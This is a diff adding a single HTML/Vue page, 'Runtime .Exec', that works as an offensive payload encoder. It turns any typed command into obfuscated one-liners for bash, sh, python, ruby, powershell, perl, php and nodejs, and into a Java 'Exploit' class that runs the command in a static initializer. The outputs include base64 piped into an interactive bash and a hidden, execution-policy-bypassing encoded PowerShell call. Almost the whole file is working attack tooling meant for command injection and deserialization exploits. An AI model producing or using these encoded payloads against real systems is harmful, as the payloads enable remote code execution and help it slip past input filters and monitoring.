@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Runtime .Exec</title>
+  </head>
+  <style>
+    .input-form {
+      width: calc(100% - 30px);
+      height: 150px;
+    }
+  </style>
+  <body>
+    <div id="app">
+      <div>
+        <h2>Runtime .Exec</h2>
+      </div>
+      <div>
+        Input type:
+        <input
+          :options="options"
+          v-model="selected"
+          type="radio"
+          id="sh"
+          name="type"
+          value="sh"
+        />
+        <label for="sh">sh</label>
+        <input
+          :options="options"
+          v-model="selected"
+          type="radio"
+          id="bash"
+          name="type"
+          value="bash"
+          checked
+        />
+        <label for="bash">bash</label>
+        <input
+          :options="options"
+          v-model="selected"
+          type="radio"
+          id="python"
+          name="type"
+          value="python"
+        />
+        <label for="python">python</label>
+        <input
+          :options="options"
+          v-model="selected"
+          type="radio"
+          id="ruby"
+          name="type"
+          value="ruby"
+        />
+        <label for="ruby">ruby</label>
+		<input
+          :options="options"
+          v-model="selected"
+          type="radio"
+          id="powershell"
+          name="type"
+          value="powershell"
+        />
+        <label for="powershell">powershell</label>
+		<input
+          :options="options"
+          v-model="selected"
+          type="radio"
+          id="perl"
+          name="type"
+          value="perl"
+        />
+        <label for="perl">perl</label>
+		<input
+          :options="options"
+          v-model="selected"
+          type="radio"
+          id="java"
+          name="type"
+          value="java"
+        />
+        <label for="java">java</label>
+		<input
+          :options="options"
+          v-model="selected"
+          type="radio"
+          id="php"
+          name="type"
+          value="php"
+        />
+        <label for="php">php</label>
+		<input
+          :options="options"
+          v-model="selected"
+          type="radio"
+          id="nodejs"
+          name="type"
+          value="nodejs"
+        />
+        <label for="nodejs">nodejs</label>
+      </div>
+      <div>
+        Input String:<br />
+        <textarea
+          class="input-form"
+          placeholder="Type command here"
+          name=""
+          id=""
+          v-model="input"
+        ></textarea>
+      </div>
+      <div>
+        Output String:<br />
+        <textarea class="input-form" placeholder="Output Command here">
+{{ output }}</textarea
+        >
+      </div>
+    </div>
+  </body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/3.3.4/vue.global.prod.min.js"></script>
+  <script>
+    var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(r){var e,t,o,h,a,d,C,c="",f=0;for(r=Base64._utf8_encode(r);f<r.length;)e=r.charCodeAt(f++),t=r.charCodeAt(f++),o=r.charCodeAt(f++),h=e>>2,a=(3&e)<<4|t>>4,d=(15&t)<<2|o>>6,C=63&o,isNaN(t)?d=C=64:isNaN(o)&&(C=64),c=c+this._keyStr.charAt(h)+this._keyStr.charAt(a)+this._keyStr.charAt(d)+this._keyStr.charAt(C);return c},decode:function(r){var e,t,o,h,a,d,C,c="",f=0;for(r=r.replace(/[^A-Za-z0-9\+\/\=]/g,"");f<r.length;)h=this._keyStr.indexOf(r.charAt(f++)),a=this._keyStr.indexOf(r.charAt(f++)),d=this._keyStr.indexOf(r.charAt(f++)),C=this._keyStr.indexOf(r.charAt(f++)),e=h<<2|a>>4,t=(15&a)<<4|d>>2,o=(3&d)<<6|C,c+=String.fromCharCode(e),64!=d&&(c+=String.fromCharCode(t)),64!=C&&(c+=String.fromCharCode(o));return Base64._utf8_decode(c)},_utf8_encode:function(r){r=r.replace(/\r\n/g,"\n");for(var e="",t=0;t<r.length;t++){var o=r.charCodeAt(t);o<128?e+=String.fromCharCode(o):o>127&&o<2048?(e+=String.fromCharCode(o>>6|192),e+=String.fromCharCode(63&o|128)):(e+=String.fromCharCode(o>>12|224),e+=String.fromCharCode(o>>6&63|128),e+=String.fromCharCode(63&o|128))}return e},_utf8_decode:function(r){for(var e="",t=0,o=c1=c2=0;t<r.length;)(o=r.charCodeAt(t))<128?(e+=String.fromCharCode(o),t++):o>191&&o<224?(e+=String.fromCharCode((31&o)<<6|63&(c2=r.charCodeAt(t+1))),t+=2):(e+=String.fromCharCode((15&o)<<12|(63&(c2=r.charCodeAt(t+1)))<<6|63&(c3=r.charCodeAt(t+2))),t+=3);return e}};const str2hex=(r,e=!0)=>{let t="",o="";for(let h=0;h<r.length;h++){e&&(o="\\x");t+=o+r.charCodeAt(h).toString(16)}return t};
+  </script>
+  <script>
+    const App={data:()=>({input:"",output:"",selected:"bash",options:[{value:"sh"},{value:"bash"},{value:"python"},{value:"ruby"},{value:"powershell"},{value:"perl"},{value:"java"},{value:"php"},{value:"nodejs"}]}),watch:{input(){if("bash"===this.selected)this.output=`bash -c {echo,${Base64.encode(this.input)}}|{base64,-d}|{bash,-i}`;else if("sh"===this.selected)this.output=`sh -c $(echo -e '${str2hex(this.input)}')`;else if("python"===this.selected)this.output=`python3 -c "exec(bytes.fromhex('${str2hex(`import os;os.system('${this.input}')`,!1)}').decode('utf-8'))"`;else if("powershell"===this.selected){let e=this.input.split("").map((e=>e+unescape("%00"))).join("");this.output=`powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ${Base64.encode(e)}`}else"ruby"===this.selected?this.output=`ruby -e "exec ['${str2hex(this.input,!1)}'].pack('H*')"`:"perl"===this.selected?this.output=`perl -MMIME::Base64 -e 'exec decode_base64("${Base64.encode(this.input)}")'`:"java"===this.selected?this.output=`import java.util.Base64;\npublic class Exploit {\n\tstatic {\n\t\ttry {\n\t\t\tjava.lang.Runtime.getRuntime().exec(new String(Base64.getDecoder().decode("${Base64.encode(this.input)}".getBytes()))).waitFor();\n\t\t} catch(Exception e) {}\n\t}\n\tpublic static void main(String[] args) {\n\t\tnew Exploit();\n\t}\n}`:"php"===this.selected?this.output=`php -r "system(base64_decode('${Base64.encode(this.input)}'));"`:"nodejs"===this.selected&&(this.output=`node -e "require('child_process').exec(atob('${Base64.encode(this.input)}'))"`)},selected(){if("bash"===this.selected)this.output=`bash -c {echo,${Base64.encode(this.input)}}|{base64,-d}|{bash,-i}`;else if("sh"===this.selected)this.output=`sh -c $(echo -e '${str2hex(this.input)}')`;else if("python"===this.selected)this.output=`python3 -c "exec(bytes.fromhex('${str2hex(`import os;os.system('${this.input}')`,!1)}').decode('utf-8'))"`;else if("powershell"===this.selected){let e=this.input.split("").map((e=>e+unescape("%00"))).join("");this.output=`powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ${Base64.encode(e)}`}else"ruby"===this.selected?this.output=`ruby -e "exec ['${str2hex(this.input,!1)}'].pack('H*')"`:"perl"===this.selected?this.output=`perl -MMIME::Base64 -e 'exec decode_base64("${Base64.encode(this.input)}")'`:"java"===this.selected?this.output=`import java.util.Base64;\npublic class Exploit {\n\tstatic {\n\t\ttry {\n\t\t\tjava.lang.Runtime.getRuntime().exec(new String(Base64.getDecoder().decode("${Base64.encode(this.input)}".getBytes()))).waitFor();\n\t\t} catch(Exception e) {}\n\t}\n\tpublic static void main(String[] args) {\n\t\tnew Exploit();\n\t}\n}`:"php"===this.selected?this.output=`php -r "system(base64_decode('${Base64.encode(this.input)}'));"`:"nodejs"===this.selected&&(this.output=`node -e "require('child_process').exec(atob('${Base64.encode(this.input)}'))"`)}},methods:{}};Vue.createApp(App).mount("#app");
+  </script>
+</html>
